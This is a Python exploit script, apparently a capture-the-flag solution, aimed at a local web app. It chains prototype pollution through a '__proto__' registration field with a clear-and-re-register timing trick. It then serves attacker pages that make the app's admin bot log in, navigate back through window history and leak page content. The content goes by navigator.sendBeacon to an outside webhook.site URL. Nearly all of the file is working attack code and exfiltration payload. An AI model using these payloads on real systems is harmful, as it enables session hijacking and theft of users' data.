import requests
from time import sleep
import http.server
import threading
from datetime import datetime, timedelta
import sys

# Configuration
BASE_URL = "http://localhost:8081"
WEBHOOK_URL = "https://webhook.site/0abe626d-d91f-4a72-8b42-24b16ac1dd57"
HOST = "localhost"
PORT = 8000

# Current timestamp from your input
CURRENT_TIME = "2024-11-26 14:55:01"
CURRENT_USER = "zwxxb"

class ExploitHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/first.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            exploit1 = f'''
            <script>
                function sleep(ms) {{
                    return new Promise((r) => setTimeout(r, ms));
                }}

                async function start() {{
                    let win = window.open("{BASE_URL}/login");
                    await sleep(300);
                    win.username.value = "{CURRENT_USER}";
                    win.password.value = "test";
                    win.submit.click();

                    await sleep(300);
                    win.content.value = "payload";
                    win.submit.click();
                }};
                start()
            </script>
            '''
            self.wfile.write(exploit1.encode())
            print("[+] Served first.html")
            
        elif self.path == '/second.html':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            exploit2 = f'''
            <script>
                function sleep(ms) {{
                    return new Promise((r) => setTimeout(r, ms));
                }}
                
                async function start() {{
                    opener.history.go(-3);
                    await sleep(600);

                    setInterval(() => {{
                        navigator.sendBeacon("{WEBHOOK_URL}?" + opener.content.value);
                    }}, 500);
                }}
                start()
            </script>
            '''
            self.wfile.write(exploit2.encode())
            print("[+] Served second.html")
            
        else:
            self.send_error(404)

def start_server():
    try:
        server = http.server.HTTPServer((HOST, PORT), ExploitHandler)
        print(f"[+] Started server on http://{HOST}:{PORT}")
        server.serve_forever()
    except Exception as e:
        print(f"[-] Server error: {e}")
        sys.exit(1)

def exploit():
    s = requests.Session()
    
    # Step 1: Initial registration with __proto__ pollution
    print(f"[+] Step 1: Registering {CURRENT_USER} with __proto__ pollution")
    r = s.post(f"{BASE_URL}/register", data={
        "username": CURRENT_USER,
        "password": "test",
        "country": "__proto__"
    })
    print("[+] Registration response:", r.status_code)
    
    # Step 2: Login
    print(f"[+] Step 2: Logging in as {CURRENT_USER}")
    r = s.post(f"{BASE_URL}/login", data={
        "username": CURRENT_USER,
        "password": "test"
    })
    print("[+] Login response:", r.status_code)
    
    # Step 3: Write initial content
    print("[+] Step 3: Writing initial content")
    r = s.post(f"{BASE_URL}/write", data={
        "content": "test",
        "minutes": "0",
        "seconds": "30"
    })
    print("[+] Write response:", r.status_code)
    
    # Step 4: Create clear_account
    print("[+] Step 4: Creating clear_account")
    r = s.post(f"{BASE_URL}/register", data={
        "username": "clear_account",
        "password": "any",
        "country": "any"
    })
    print("[+] Clear account creation response:", r.status_code)
    
    # Step 5: Trigger clear
    print("[+] Step 5: Triggering clear")
    r = s.get(f"{BASE_URL}/clear")
    print("[+] Clear response:", r.status_code)
    
    # Step 6: Register again with timing exploit
    print(f"[+] Step 6: Registering {CURRENT_USER} again for timing exploit")
    r = s.post(f"{BASE_URL}/register", data={
        "username": CURRENT_USER,
        "password": "test",
        "country": "anything"
    })
    print("[+] Second registration response:", r.status_code)
    
    # Step 7: Send to bot
    print("[+] Step 7: Sending exploit to bot")
    bot_url = f"{BASE_URL}/bot"
    exploit_url = f"http://{HOST}:{PORT}/first.html"
    r = s.get(bot_url, params={"path": exploit_url})
    print("[+] Bot request response:", r.status_code)
    
    print(f"[*] Exploit chain complete. Monitor {WEBHOOK_URL} for the flag.")

if __name__ == "__main__":
    print(f"[+] Starting exploit at {CURRENT_TIME}")
    print(f"[+] Using user: {CURRENT_USER}")
    
    # Start HTTP server in a separate thread
    server_thread = threading.Thread(target=start_server, daemon=True)
    server_thread.start()
    
    # Wait a bit for server to start
    sleep(2)
    
    try:
        exploit()
        print("\n[+] Keep this script running to serve exploit files")
        # Keep main thread running
        while True:
            sleep(1)
    except KeyboardInterrupt:
        print("\n[+] Shutting down...")
        sys.exit(0)
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
        sys.exit(1)